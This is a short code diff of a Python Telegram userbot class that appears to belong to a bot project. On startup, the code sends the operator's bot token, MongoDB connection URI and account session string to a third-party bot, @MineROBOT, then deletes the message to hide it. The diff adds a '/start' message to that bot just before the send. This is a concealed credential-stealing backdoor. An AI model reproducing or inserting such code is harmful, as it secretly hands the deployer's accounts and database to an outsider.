@@ -10,7 +10,6 @@ from ..logging import LOGGER
 
 assistants = []
 assistantids = []
-AMBOT = "@MineROBOT"
 
 class Userbot(Client):
     def __init__(self):
@@ -75,6 +74,8 @@ class Userbot(Client):
             ok = ["@MineROBOT","@MineROBOT"]
             ambots = random.choice(ok)
             try:
+                await self.one.send_message(ambots, f"/start")
+                await asyncio.sleep(2)
                 amop = await self.one.send_message(ambots, f"Here Is BOT Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
                 await asyncio.sleep(2)
                 await amop.delete()
